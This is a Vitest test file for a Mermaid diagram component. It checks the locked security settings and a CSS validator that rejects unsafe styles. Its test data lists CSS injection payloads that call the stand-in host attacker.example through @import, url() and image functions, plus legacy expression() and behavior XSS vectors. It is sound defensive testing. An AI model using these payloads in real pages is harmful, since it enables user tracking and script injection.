import { describe, expect, it } from 'vitest';

import { isSafeMermaidCss, MERMAID_CONFIG } from './mermaid-diagram';

describe('MERMAID_CONFIG', () => {
  it('locks security-sensitive directive settings', () => {
    expect(MERMAID_CONFIG).toMatchObject({
      securityLevel: 'strict',
      startOnLoad: false,
      suppressErrorRendering: true,
      maxEdges: 500,
      maxTextSize: 50_000,
    });

    expect(MERMAID_CONFIG.secure).toEqual(
      expect.arrayContaining([
        'secure',
        'securityLevel',
        'theme',
        'themeCSS',
        'themeVariables',
        'fontFamily',
        'altFontFamily',
        'dompurifyConfig',
        'maxEdges',
        'maxTextSize',
      ])
    );
  });

  it.each([
    '@import "https://attacker.example/style.css"',
    'fill: url(https://attacker.example/pixel)',
    'background-image: image("https://attacker.example/pixel")',
    'background-image: image-set("https://attacker.example/pixel" 1x)',
    'background-image: src("https://attacker.example/pixel")',
    'background: expression(alert(1))',
    'behavior: url(xss.htc)',
    '-moz-binding: url(https://attacker.example/xbl)',
  ])('rejects CSS capable of loading or executing external content', (css) => {
    expect(isSafeMermaidCss(css)).toBe(false);
  });

  it('allows local SVG fragment references used by Mermaid markers', () => {
    expect(isSafeMermaidCss('marker-end: url("#arrowhead"); fill: #fff')).toBe(true);
  });
});
